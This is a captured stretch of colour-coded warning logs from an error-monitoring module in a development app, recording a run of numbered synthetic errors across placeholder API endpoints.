WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2938'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845527Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2939'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845575Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2940'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845623Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2941'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2942'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845719Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2943'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2944'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2945'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2946'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2947'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.845972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2948'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m59[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2949'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846072Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2950'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2951'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2952'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846229Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2953'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2954'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846328Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2955'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846378Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2956'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846427Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2957'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846478Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2958'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846527Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2959'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846575Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2960'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2961'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846674Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2962'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2963'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846843Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2964'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2965'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.846950Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2966'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847057Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2967'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2968'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2969'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847231Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2970'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847284Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2971'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847336Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2972'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847389Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2973'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847439Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2974'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847490Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2975'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847543Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2976'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.847598Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m60[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2977'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
